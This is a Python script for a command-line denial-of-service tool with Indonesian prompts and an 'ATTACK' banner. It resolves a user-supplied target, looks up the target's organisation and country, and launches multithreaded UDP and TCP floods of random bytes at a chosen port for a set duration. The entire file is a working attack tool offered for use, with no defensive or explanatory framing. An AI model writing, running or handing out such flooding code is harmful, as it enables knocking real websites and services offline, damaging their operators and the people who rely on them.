import socket
import threading
import random
import time
import requests
import sys

def get_ip_from_url(url):
    try:
        return socket.gethostbyname(url)
    except socket.gaierror:
        print("Hostname could not be resolved.")
        sys.exit()

def mix_attack(target, port, duration, num_threads):
    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                # UDP attack
                udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                udp_bytes = random._urandom(1)
                udp_client.sendto(udp_bytes, (target, port))
                udp_client.close()

                # TCP attack
                tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_client.connect((target, port))
                tcp_client.send(random._urandom(1))
                tcp_client.close()
            except Exception:
                pass

    # Starting threads
    threads = []
    for _ in range(num_threads):  # Number of threads
        thread = threading.Thread(target=flood)
        print("SENDING 1x UDP&TCP")
        threads.append(thread)
        thread.start()

    # Waiting for threads to finish
    for thread in threads:
        thread.join()

def get_org_and_country(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        org = data.get("org", "Unknown")
        country = data.get("country", "Unknown")
        return org, country
    except requests.RequestException:
        return "Unknown", "Unknown"

def print_panel(target, method, org, country):
    print("┏━━━━━━━━━━━━━━━━━━━━┳┓")
    print("┃ ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ┃┃")
    print("┃ ╠═╣ ║  ║ ╠═╣║  ╠╩╗ ┃┃")
    print("┃ ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ ┃┃")
    print("┗━━┳━━━━━━━━━━━━━━━━━┻┛")
    print("   ┣━STATUS")
    print("   ┃  └─[      SERANGAN TERKIRIM      ]")
    print("   ┣━━ATTACK")
    print(f"   ┃   ├─TARGET {target}")
    print(f"   ┃   └─METHOD {method}")
    print("   ┣━━TARGET")
    print(f"       ├─ORG {org}")
    print(f"       └─COUNTRY {country}")

def main():
    print("PANEL")
    while True:
        command = input("Masukkan perintah (contoh: MIX example.com 80 60 10): ").strip()
        if command.startswith("MIX"):
            try:
                _, target, port, duration, num_threads = command.split()
                port = int(port)
                duration = int(duration)
                num_threads = int(num_threads)

                # Resolve URL to IP if necessary
                if target.startswith("http://") or target.startswith("https://"):
                    target = target.split("://")[1]
                if not target.replace('.', '').isdigit():
                    target = get_ip_from_url(target)

                org, country = get_org_and_country(target)
                print_panel(target, "mix", org, country)
                mix_attack(target, port, duration, num_threads)
            except ValueError:
                print("Format perintah salah. Gunakan format: MIX [target] [port] [durasi] [threads]")
        else:
            print("Perintah tidak dikenal. Gunakan format: MIX [target] [port] [durasi] [threads]")

if __name__ == "__main__":
    main()